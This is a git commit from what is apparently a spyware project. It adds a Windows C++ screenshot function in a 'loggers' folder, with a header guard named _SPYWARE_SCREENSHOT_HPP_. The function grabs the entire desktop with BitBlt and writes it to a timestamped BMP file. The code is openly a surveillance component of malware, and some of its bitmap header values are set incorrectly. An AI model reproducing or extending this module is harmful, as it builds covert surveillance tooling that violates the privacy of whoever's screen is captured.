36d0a72def05cef87c738ac394a631e301f2a5a0
Abderrahman-byte <el.abderrahman00@gmail.com>
2021-11-01 15:34:12 +0000

    Do screen shot and save to a file

---
+++ src/loggers/screenshot.cpp
@@ -0,0 +1,60 @@
+#include <iostream>
+
+#if defined(_WIN64) || defined(_WIN32)
+#include <windows.h>
+#include <winuser.h>
+#include <winbase.h>
+#endif
+
+#include "screenshot.hpp"
+#include "../core/utils.hpp"
+
+#if defined(_WIN64) || defined(_WIN32)
+void ScreenShot () {
+    DWORD screenshotWidth, screenshotHeight, fileSize;
+    HWND hwndDesktop = GetDesktopWindow(); // get Desktop windows handle
+    HDC hDevC = GetDC(hwndDesktop);
+    HDC captureDC = CreateCompatibleDC(hDevC);
+    HBITMAP captureBmp;
+    RECT rectDesktopParams; // Get cords of a rectangle
+    char *BmpData; // Data of screen shot image file
+    RGBTRIPLE *Image; // contain of the image
+    PBITMAPFILEHEADER BmpFileHeader; // Image file header
+    PBITMAPINFOHEADER BmpInfoHeader; // Image info header
+
+    GetWindowRect(hwndDesktop, &rectDesktopParams); // Get rectangle of the desktop window
+    screenshotWidth = rectDesktopParams.right - rectDesktopParams.left;
+    screenshotHeight = rectDesktopParams.bottom - rectDesktopParams.top;
+
+    fileSize = (sizeof(RGBTRIPLE)  + 1 * (screenshotWidth*screenshotHeight*4)) + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
+    BmpData = (char *)GlobalAlloc(GPTR, fileSize);
+
+    BmpFileHeader = (PBITMAPFILEHEADER)BmpData;
+    BmpInfoHeader = (PBITMAPINFOHEADER)&BmpData[sizeof(BITMAPFILEHEADER)];
+
+    // Set BitMap File header data
+    BmpFileHeader->bfType = 0x4D42;
+    BmpFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
+    BmpFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+    // Set Bitmap Info header data
+    BmpInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
+    BmpInfoHeader->biPlanes = 1;
+    BmpInfoHeader->biBitCount = 24;
+    BmpInfoHeader->biCompression = BI_RGB;
+    BmpInfoHeader->biWidth = screenshotWidth;
+    BmpInfoHeader->biHeight = screenshotHeight;
+
+    Image = (RGBTRIPLE*)&BmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
+    
+    captureBmp = CreateCompatibleBitmap(hDevC, screenshotWidth, screenshotHeight);
+    SelectObject(captureDC, captureBmp);
+    BitBlt(captureDC, 0, 0, screenshotWidth, screenshotHeight, hDevC, 0, 0, SRCCOPY | CAPTUREBLT);
+    GetDIBits(captureDC, captureBmp, 0, screenshotHeight, Image, (LPBITMAPINFO)BmpInfoHeader, DIB_RGB_COLORS);
+
+    std::string filename = std::to_string(getTimestamp()) + ".bmp";
+
+    writeBytesToFile(filename, BmpData, fileSize);
+    GlobalFree(BmpData);
+}
+#endif
---
+++ src/loggers/screenshot.hpp
@@ -0,0 +1,5 @@
+#ifndef _SPYWARE_SCREENSHOT_HPP_
+#define _SPYWARE_SCREENSHOT_HPP_ 1
+
+void ScreenShot();
+#endif
